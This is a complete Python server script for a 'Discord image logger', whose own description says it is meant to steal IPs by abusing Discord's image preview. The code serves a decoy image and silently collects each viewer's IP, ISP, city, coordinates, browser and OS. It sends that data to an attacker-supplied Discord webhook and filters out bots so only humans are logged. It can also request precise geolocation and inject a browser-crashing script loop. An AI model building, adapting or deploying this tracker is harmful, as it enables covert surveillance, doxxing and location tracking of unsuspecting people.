# Discord Image Logger - Replit Edition (Full Code)
# Based on DeKrypt / Ankit15015 Logic
# Modified for Dynamic Parameters via URL

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import os

__app__ = "Astro Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0-Replit"
__author__ = "DeKrypt / Astro"

config = {
    # BASE CONFIG #
    "webhook": "", # Will be overwritten by URL parameter
    "image": "https://cdn.pixabay.com/photo/2023/07/04/08/31/cats-8105667_1280.jpg", # Default fallback
    "imageArgument": True, # Allows you to use a URL argument to change the image

    # CUSTOMIZATION #
    "username": "Astro Logger", 
    "color": 0x00FFFF, 

    # OPTIONS #
    "crashBrowser": False, 
    
    "accurateLocation": False, 

    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by Astro Image Logger.", 
        "richMessage": True, 
    },

    "vpnCheck": 1, 
                
    "linkAlerts": True, 
    "buggedImage": True, 

    "antiBot": 1, 
    
    # REDIRECTION #
    "redirect": {
        "redirect": False, 
        "page": "" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    if not config["webhook"]: return
    try:
        requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })
    except: pass

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        })
            except: pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "UTC", "mobile": False, "proxy": False, "hosting": False}

    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    try:
        os_name, browser = httpagentparser.simple_detect(useragent)
    except:
        os_name, browser = "Unknown", "Unknown"
    
    desc_text = "**A User Opened the Original Image!**\n\n"
    desc_text += f"**Endpoint:** `{endpoint}`\n\n"
    desc_text += "**IP Info:**\n"
    desc_text += f"> **IP:** `{ip if ip else 'Unknown'}`\n"
    desc_text += f"> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`\n"
    desc_text += f"> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`\n"
    desc_text += f"> **Country:** `{info['country'] if info['country'] else 'Unknown'}`\n"
    desc_text += f"> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`\n"
    desc_text += f"> **City:** `{info['city'] if info['city'] else 'Unknown'}`\n"
    
    coord_str = str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')
    map_link = 'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'
    desc_text += f"> **Coords:** `{coord_str}` ({map_link})\n"
    
    tz_parts = info['timezone'].split('/')
    tz_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})" if len(tz_parts) > 1 else info['timezone']
    desc_text += f"> **Timezone:** `{tz_display}`\n"
    desc_text += f"> **Mobile:** `{info['mobile']}`\n"
    desc_text += f"> **VPN:** `{info['proxy']}`\n"
    
    bot_status = 'False'
    if info['hosting']:
        bot_status = 'Possibly' if not info['proxy'] else str(info['hosting'])
    desc_text += f"> **Bot:** `{bot_status}`\n\n"
    
    desc_text += "**PC Info:**\n"
    desc_text += f"> **OS:** `{os_name}`\n"
    desc_text += f"> **Browser:** `{browser}`\n\n"
    desc_text += "**User Agent:**\n"
    desc_text += f"```\n{useragent}\n```"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": desc_text,
            }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json = embed, timeout=5)
    except: pass
    
    return info

# Base64 encoded 1x1 Transparent PNG for Discord Bot Preview
LOADING_PNG = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            
            # DYNAMIC PARAMS FROM URL
            if config["imageArgument"]:
                if dic.get("img"):
                    url = dic.get("img")
                elif dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # Update Webhook from URL if provided
            if dic.get("webhook"):
                config["webhook"] = dic.get("webhook")

            if not config["webhook"]:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Missing Webhook Parameter")
                return

            data = f'''<style>body {{
margin: 0;
padding: 0;
background: #000;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            client_ip = self.headers.get('x-forwarded-for', self.client_address[0])
            user_agent = self.headers.get('user-agent', 'Unknown')

            if client_ip.startswith(blacklistedIPs):
                return
            
            if botCheck(client_ip, user_agent) or "Discordbot" in user_agent:
                self.send_response(200 if config["buggedImage"] else 302) 
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/png' if config["buggedImage"] else url) 
                self.end_headers() 

                if config["buggedImage"]: 
                    self.wfile.write(LOADING_PNG) 

                makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                if dic.get("g") and config["accurateLocation"]:
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                        result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = url)
                    except:
                        result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = url)
                else:
                    result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", client_ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", 0)))
                    message = message.replace("{long}", str(result.get("lon", 0)))
                    
                    tz = result.get('timezone', 'UTC')
                    if '/' in tz:
                        tz_fmt = f"{tz.split('/')[1].replace('_', ' ')} ({tz.split('/')[0]})"
                    else:
                        tz_fmt = tz
                    message = message.replace("{timezone}", tz_fmt)
                    
                    message = message.replace("{mobile}", str(result.get("mobile", False)))
                    message = message.replace("{vpn}", str(result.get("proxy", False)))
                    
                    hosting = result.get("hosting", False)
                    proxy = result.get("proxy", False)
                    if hosting and not proxy:
                        bot_val = "Possibly"
                    elif hosting:
                        bot_val = str(hosting)
                    else:
                        bot_val = "False"
                    message = message.replace("{bot}", bot_val)
                    
                    try:
                        parsed_ua = httpagentparser.simple_detect(user_agent)
                        message = message.replace("{browser}", parsed_ua[1])
                        message = message.replace("{os}", parsed_ua[0])
                    except:
                        message = message.replace("{browser}", "Unknown")
                        message = message.replace("{os}", "Unknown")

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' 

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200) 
                self.send_header('Content-type', datatype) 
                self.end_headers() 

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

    def log_message(self, format, *args):
        pass # Suppress console logs

handler = ImageLoggerAPI

if __name__ == "__main__":
    from http.server import HTTPServer
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), ImageLoggerAPI)
    print(f"Astro Image Logger running on port {port}")
    server.serve_forever()
